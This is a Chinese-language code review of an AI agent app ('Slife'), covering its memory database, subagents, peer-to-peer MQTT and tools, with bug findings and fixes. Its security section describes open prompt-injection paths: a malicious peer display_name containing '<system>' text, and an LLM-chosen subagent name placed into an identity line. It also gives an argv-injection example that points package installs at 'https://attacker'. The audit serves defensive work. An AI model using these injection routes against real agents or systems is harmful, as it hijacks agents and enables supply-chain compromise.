# Slife Code Review

**日期:** 2026-08-13 · **基线:** 1881 tests pass（评审初始 1864 → 修复后 1881，全绿）

本次重审：6 个并行子系统评审（memdb / agent 核心 / system_prompt / UI / tools / a2a·mcp·subagent·config），高危项已逐条复核到源码（标注 ✓）。低危项为评审结论，未经逐行复核。✅ = 已修复（2026-08-13）；其余为**当前仍存在的问题**。

---

## 1. 高危（正确性 — 静默丢数据 / 崩溃 / 永久降级）

> ✅ 本节 5 项已全部修复（2026-08-13）。

- **✅ memdb 双重 `setup()` 泄漏连接 + 提交竞态** — `store.py:73` 无条件下 `self._conn = await aiosqlite.connect(...)`；`_warm_embedder_then_reindex`（`server.py:208-211`）在同一 `SessionStore` 上再次 `setup()`，旧连接 A 未 close 即被 B 覆盖。`_c` property 每次读 `self._conn`，一个 `save_turn` 的 `execute` 落在 A、`commit` 落在 B → INSERT 永不提交、turn 静默丢失。注释声称"无 re-creation"，但 `setup()` 实际重新赋值连接。→ 新增 `reconfigure_for_embedding` 复用现有连接。
- **✅ memdb 模型切换重建 store 未持锁** — `_reinit_store_after_model_change`（`server.py:456-488`）不持 `_init_lock`，先 `_store=None`、close 旧库、再重建。竞态：并发 `_ensure_store` 见 `_store is None` 在锁内建了 C，随后 reinit 用 `_store = new_store` 覆盖 C → C 泄漏；同时在飞的 `__memory_save_turn` 已抓旧 store 引用，连接被 `old_store.close()` 关闭 → commit 失败、turn 丢失。→ reinit 与 save 现在都持 `_init_lock`。
- **✅ 单段超长 chunk 被静默丢弃 → 语义门永远打不开** — `_chunk_text`（`store.py:996-1015`）只按换行分段、不切单段；`save_turn`（`store.py:310-313`）过滤 `len//4 > max_tokens` 的 chunk。一条无换行 >~2KB（bge-large）或 >~32KB（bge-m3）的行 → `valid_chunks=[]` → 永不 embed → `count_unembedded()` 恒 >0 → `_background_reindex` 撞 20 批 no-progress 上限放弃（`server.py:426-436`）→ `_semantic_ready` 永假，全库语义搜索永久退化为 FTS5，且每次搜索重跑一次注定失败的 reindex。→ 新增 `_split_chunks_to_token_limit` 硬切而非丢弃。
- **✅ `save_to_memory` 按原始文本回溯 → 空 turn 保存（静默丢数据）** — `service.py:1299-1313` 用 `content == user_message`（原始）匹配，但 `add_user_message` 已 `sanitize_secrets(content)`（`conversation.py:130`）。两条触发路径：① 用户消息含密钥 → 存储内容被脱敏 → 匹配失败 → `turn_messages=[]` → 该轮 assistant/tool 工作永不入库；② 内容过滤回滚 `pop_last_turn()` 后 `finally` 仍 `save_to_memory` → 存一行 `messages:[]`，被拒内容仍落库。→ 改为脱敏后比对；无匹配则跳过保存。
- **✅ UI 工具名经 rich markup 渲染 → 崩溃/样式注入** — `tool_display.py:220` 把 `_friendly_label(self.tool_name)`（`replace("_"," ").capitalize()`，不剥 `[`）塞进 `_mc(f"[bold]{label}[/bold]")`。MCP 注册工具名如 `get[item` → `MarkupError` 从 `ToolCallWidget.__init__`（`on_tool_call` 无 try/except）冒泡 → 整轮 abort；`foo[red]bar` → 样式注入。文件自身契约（`tool_display.py:81-99`）要求 `_mc` 永不过用户/工具数据，此处违反；同源工具名 `ApprovalPrompt` 已用 `_lit`。→ 工具名与参数键改走 `_lit`。

## 2. 安全（注入 / 密钥泄漏）

> ✅ 已修 3 项（脱敏覆盖面 / config_env_get 门 / exec.py 日志）；仍剩 3 项注入类 + 1 处文件名 markup。

- **远端 peer 名字原文注入模型上下文（跨代理提示注入）** — `context_status.j2:19` `{{ ev.text }}` ← `format_presence_line`（`a2a/card.py:77-98`）← 远端 MQTT presence 的 `display_name`/`agent_id`（`a2a/client.py:509-515` 无长度/合法性校验）。恶意 peer 发布 `display_name="\n\n<system>..."` → 原样进每轮 `_sys_note`。
- **`subagent_name` 由 LLM 控制、原样进子代理 system prompt** — `system_prompt.py:100` 读 `SLIFE_SUBAGENT_NAME`，`subagent.j2:2` 渲染 `You are {{ subagent_name }}`。来源 `spawn_subagent` 的 `name` 参数（`subagent/process.py:124`）无校验 → 受注入的父代理可注入子代理身份行。
- **✅ `config_env_get` 原样吐密钥** — `tools/config.py:135-153` 读 `os.environ` + `slife.json5 env:`，含 list-all 分支枚举全部。→ 其输出走 tool-output 门（`loop.py` `sanitize_secrets`），门覆盖补齐后凭据不再到 LLM。
- **✅ `sanitize_secrets` 覆盖面缺口** — 补 `sk_live_`/`sk_test_`/`rk_live_`（Stripe 下划线）、AWS/Stripe `*_SECRET_KEY`/`*_ACCESS_KEY` 复合名、短密下限 6 字符、连接串 URL 内嵌密码。
- **⚠️ 工具参数键 / 图片文件名经 markup** — `tool_display.py:258` 键已修（→`_lit`）；`image_utils.py:69-71` 把 `path.name` 塞进 `from_markup` 仍开。
- **✅ `execute_shell` 日志原样记命令** — `tools/exec.py` 四行日志已过 `sanitize_secrets`。
- **`install_python_package` 无 `--` 守卫的 argv 注入** — `tools/exec.py:241-243` `create_subprocess_exec("uv","pip","install","--python",sys.executable,*packages)`；`packages=["--index-url","https://attacker","requests"]` 被当 uv 旗标 → 供应链重定向进 slime 解释器。

## 3. 中危（正确性 / 一致性）

> ✅ 本节 7 项已全部修复（2026-08-13）。

- **✅ 20% 硬上限冻结在初始模型** — `service.py:144-148` 在 `__init__` 算 `max_tool_result_chars`，`reload_active_model`（`service.py:280-284`）只更新 `context_window` 不更新它。128K→32K 切模型后，cap 仍是 0.2·128K·3=76800 = 新窗口 240% → 超大 tool result 绕过 `loop.py:747` 溢出窗口 → API 400。`_usage_by_conv` 也不清，报告旧模型 token。→ reload 时重算 cap + 清 `_usage_by_conv`。
- **✅ Anthropic 空 assistant content 出线** — `llm_backends/anthropic.py:120-137`：`content` 空且无 `tool_calls` 时 `blocks==[]`，仍 append `{"role":"assistant","content":[]}`；可达自 `loop.py:904-907`（reasoning-only / max_tokens 截断中间）。下轮 `_oa_msgs_to_anthropic` 发出空 content → 400。→ 空 blocks 时补一个空 text block。
- **✅ subagent 同步超时后迟到响应误路由 + `_inflight` 双扣** — `subagent/process.py:219-227,406-418`：超时已 pop `_pending`、扣 `_inflight`、标 failed，但 child 仍在跑；迟到响应走 async 分支再扣一次 `_inflight`、覆盖回 completed、再 `_notify_manager_task_done` → 用户先见"failed: timed out"后见假完成的 stale 结果，且抢了后续任务的 in-flight 槽位。→ timeout/cancel 都加 `_cancelled.add(rpc_id)`。
- **✅ `count_turns` grep 模式未加括号的 OR** — `store.py:393,420-427`：`user_message LIKE ? OR messages LIKE ? AND created_at >= ?` 解析为 `user_message LIKE ? OR (messages LIKE ? AND created_at >= ?)` → 早于 `since` 的 turn 只要 user_message 命中就被计数。`search_grep`（`store.py:716-724`）已正确加括号，仅 count 路径错。→ grep where 加括号。
- **✅ `memory_summarize` 的 summary/tags 对关键字搜索不可见** — `schema.sql` 只有 `AFTER INSERT`/`AFTER DELETE` FTS5 触发器，无 `AFTER UPDATE`；`memory_summarize` 用 `UPDATE diary SET summary=?, tags=?`（`store.py:472-492`）→ FTS5 倒排仍停留在 insert 时的空索引。仅关键字部署下，总结永不可被搜到。→ schema 加 `AFTER UPDATE` 触发器。
- **✅ gguf `create_embedding` 同步阻塞事件循环** — `embeddings.py:449-455` 在 `for` 循环里直接跑同步 `create_embedding()`，不像 transformer/api 走 `run_daemon` 线程。reindex 大量 turn 时整个事件循环被阻塞数秒。注释已自认"考虑线程池"。→ 走 `run_daemon` 线程。
- **✅ restore 用户图片附件永不恢复** — `restore.py:267-270,350,457-462`：`ui_ops` 读 `images` 但合成 user message 从不带 `images` 键；`extract_turns`/`save_to_memory` 也不存多模态 content → `@path/img.png` 恢复后变纯文本 `@path`（无缩略图、也不进恢复后的 LLM 上下文）。→ diary 加 `images` 列 + 迁移 + 保存/恢复全链路。

## 4. 低危（边角 / 资源泄漏 / 展示）

> ✅ 已修复 19 项（标 ✅）。剩余为长期进程资源增长 / 展示类，属可接受风险，未改。

- `_usage_by_conv` 以 `id(conversation)` 为键无界增长 + id 复用读脏（`loop.py:240,391,561`）。（模型切换时已清缓存，无界增长仍在）
- ✅ trim 时 `_context_turn_dates` 只含恢复期 turns，新 turn 不在内 → `_context_time_start` 变陈旧。→ 新 turn 时追加日期，trim 不再下溢。
- ✅ `heartbeat_interval` 读一次；`or HEARTBEAT_INTERVAL` 掩掉 0（无法关停），负值 → `asyncio.sleep(-1)` ValueError 杀掉心跳。→ 非正数/非法值回退默认。
- subagent `_task_records`/`_cancelled` 无界增长（`process.py:76,82,311-325,287`）。
- ✅ MQTT 队列 `maxsize=0` 无背压，`QueueFull` 处理是死代码（`a2a/mqtt.py:81,337-346`）。→ 队列加 `maxsize=1000`。
- ✅ a2a `_completed_tasks` 无界；取消的同步等待留永久 pending 记录（`a2a/client.py:106,295-300,332-337`）。→ 结果缓存上限 100；取消时标记 record。
- ✅ MQTT `connect()` 超时泄漏 paho 线程；`_closed` 从不重置 → 复用同一 adapter 静默停发。→ connect 重置 `_closed`/event，失败时 `loop_stop`。
- ✅ 重复 agent 检测只采样 1.5s 的 presence（`a2a/client.py:146-161`）。→ 采样窗口提到 5s（仍 best-effort）。
- ✅ oauth `expires_at==0` 视为永不过期；`interval` 不设下限。→ expires_at<=0 视为过期；interval 下限 1s。
- ✅ `_RELATIVE_DATES` 模块级缓存跨午夜冻结。→ 日期变更时刷新。
- ✅ FTS5 保留算符不转义；CJK 判定只覆盖 U+4E00–U+9FFF。→ 保留算符加引号；CJK 覆盖扩展 A。
- ✅ 时间过滤按带偏移的 `created_at` 字符串字典序比 `since`/`until`，跨偏移边界错序。→ `_normalize_time_param` 把带偏移的输入归一化到本地偏移。
- ✅ standalone headless 下 subagent 身份退化为 `You are , ...`。→ 模板 `or` 兜底。
- ✅ `slife.j2:22` 硬编码 `\` 分隔符，POSIX 下路径错。→ 改 `/`。
- ✅ `os_version` 是内核 build 号而非 OS 版本。→ 新增 `_os_version()` 映射为 "11"/"10"/macOS 版本。
- ✅ `compact_tool_results` 二次应用不幂等。→ 已含标记则跳过。
- ✅ `_config_io.write_config` 不保留权限、无 `fsync`。→ 加 `fsync` + 保留原权限。
- ✅ `ToolRegistry.register` 重名静默覆盖。→ 记 warning。
- `_mask_value` 披露前 4 + 后 4 字符。（有意的部分披露）
- `config_env_set`/`model_set` 回显并落盘明文密钥，无强制。
- ✅ restore 孤儿 tool-call 修复 UI 与对话不一致。→ 先 `_ensure_turn_consistent` 再建 `tool_results`/`ui_ops`。
- ✅ model picker 无重入保护，连按 Ctrl+S 叠 picker 泄漏 task。→ `_model_picker_open` 重入守卫。
- ✅ 状态栏 model 名经 markup（`app.py:51,77`，仅 config 可控）。→ 转义 `[`。

## 5. 测试与 CI 缺口

- **旧评审"wheel 从未被执行"已修复**：CI 现在 `uv build` 后 `uv pip install dist/slife-*.whl dist/credstore-*.whl` 再跑测试，真正跑的是 wheel（`ci.yml`）。
- ✅ `pytest-cov`/`pytest-xdist` 装了不用 → 已从 CI 安装移除；`publish.yml` 未锁版本 `twine` → 已锁 `twine<6`。
- 仍开放：无覆盖率门槛、无 deselect、无安装脚本冒烟。
- ⚠️ 低质量测试：已修 `test_tools_shell.py:144`（同义反复 → 断言有效字节存活）、`test_main.py:41`（无断言 → 补 3 断言）。仍未做：subagent 真实子进程集成测试、审批 Esc 挂真实 app（Textual 集成）、`test_ui_app.py` 疑似无断言用例（行号已漂移，需专项扫）。

## 6. 值得保持的模式

- memdb SQL 全参数化（仅固定模板 + `?` 占位）；KNN 无 JOIN、`k=?` 绑定整数——sqlite-vec 用法正确，无注入。
- `compact_tool_results` 主路径正确：head/tail 无 off-by-one，只在副本上截断、保留 `tool_call_id`，不扰动 live 对话，不产生孤儿 tool result。
- `save_turn` 在 vec insert commit 前不把 turn 计为已索引；`EmbeddingClient.load()` 的 `_loading` future 无 await 间隙、竞态安全。
- `get_recent_turns` 的连接 close 已修对（`finally` + `_conn=None`，`setup` 失败前 `_conn` 仍 `None` 时 close 是 no-op），无 use-after-close。
- 时间戳映射正确（`created_at`=用户回车、`completed_at`=turn 结束，错误/取消路径也写）；心跳不污染状态栏（`_SilentHandler` + 每会话 `_usage_by_conv`）。
- 心跳停止干净（sleep 在 try 外、`start_inbox` 用 `_heartbeat_task.done()` 防双启）。
- Anthropic/Responses 线格式正常路径正确（严格交替 + 最后 system 块缓存标记；Responses 原生工具项；取消先 abort 流再 commit）。
- oauth Device Code 正确省略 nonce/state；`client_secret` 走 body；refresh 仅在终态失效时删。
- 配置写入原子（temp + `os.replace` + 锁 + 异常清理）；skill zip 解压防穿越/绝对路径/符号链接。
- Textual 无 `@work`/`call_from_thread`/`thread=True`，所有 UI 变更都在主循环；审批 Esc/Y/N 在本 Textual 版本（8.2.8）上优先级绑定正确（旧评审的 Esc 疑虑不复现）。

## 7. Repo 卫生

- `slife.db`（含 `-wal`/`-shm`）、`slife.db.bak-before-orphan-clean`、`.coverage`、`credentials.crypt`、`logs/` 均为未跟踪本地数据，保持不提交。
- 文档已同步（本轮又加了 `DESIGNER_NOTES.md`）；改工具面/系统提示时保持 README/DESIGN 同步。
